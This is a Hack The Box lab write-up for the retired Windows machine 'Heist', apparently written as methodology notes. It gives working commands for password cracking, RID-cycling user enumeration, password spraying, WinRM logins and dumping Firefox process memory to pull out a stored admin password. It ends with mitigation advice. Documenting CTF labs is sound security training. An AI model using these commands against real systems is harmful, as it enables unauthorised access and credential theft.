---
machine: Heist
os: Windows
difficulty: Easy
platform: Hack The Box
category: Web / Windows
state: Retired
tags: [windows, iis, cisco-type7, smb, rid-cycling, winrm, procdump, firefox]
---

# Heist — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Not a single software exploit: it is all credential hygiene. The support portal allows guest access and exposes a ticket with a **Cisco IOS config** attached; its *type 7* passwords (reversible by design) and its `enable secret 5` (MD5crypt) are cracked and **reused** against the Windows accounts. One user gets in over **WinRM**, and because a **Firefox** instance keeps the administrator's portal session, a process memory dump hands over that password.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp   open  http     Microsoft IIS httpd 10.0
135/tcp  open  msrpc    Microsoft Windows RPC
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

WinRM on 5985 is the hint for the way in. Add the vhost:

```bash
echo "<IP> heist.htb" | sudo tee -a /etc/hosts
```

## Access

1. **Guest on the portal** (`http://heist.htb/login.php`): the `guest=true` parameter skips the login and lands on `issues.php`, where user `hazard` attached `/attachments/config.txt`.

2. **Router credentials**:

```text
username rout3r password 7 <type7>
username admin privilege 15 password 7 <type7>
enable secret 5 $1$<hash>
```

- *Type 7* is reversible XOR: any Cisco decoder returns it in clear.
- *Type 5* is MD5crypt:

```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

3. **RPC user enumeration**: with `hazard`'s password, query the local domain and RID-cycle.

```bash
rpcclient -U 'hazard%<password>' <IP>
rpcclient -U 'hazard%<password>' <IP> -c 'lookupsid 1000 1200'
```

`chase` and `jason` show up among others.

4. **Password spray and WinRM**:

```bash
crackmapexec winrm <IP> -u users.txt -p passwords.txt --continue-on-success
evil-winrm -i <IP> -u chase -p '<password>'
```

```text
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
```

## Escalation

`todo.txt` on Chase's desktop says "Keep checking the issues list", and a `firefox.exe` is running (not the default browser on a server). That Firefox holds the support portal administrator's session in memory.

```powershell
Get-Process firefox
procdump.exe -ma <PID> C:\Windows\Temp\ff.dmp
```

```powershell
Select-String -Path C:\Windows\Temp\ff.dmp -Pattern 'login_password' -Encoding Unicode
```

The dump yields the portal password for `admin@support.htb`, **the same** as the `Administrator` account:

```bash
evil-winrm -i <IP> -u Administrator -p '<password>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

## Pitfalls

- **`guest=true`**: the normal login rejects; the bypass is a GET parameter, not a form.
- **SMB with no useful shares**: `hazard` authenticates but reaches nothing interesting; the value is in RPC user listing.
- **Spraying without lockout**: none here, but try one password per user before sweeping a dictionary.
- **`procdump` permissions**: if `C:\Windows\Temp` is not writable, use the user profile.

## Lessons

- Cisco *type 7* passwords are obfuscation, not encryption.
- Reusing an application password as a system password bridges two separate worlds.
- A browser left open with an admin session is a credential in memory: `procdump` plus `strings` extracts it.
- Mitigation: unique per-service passwords, scrub ticket attachments, close browser sessions on servers, and disable WinRM where unnecessary.
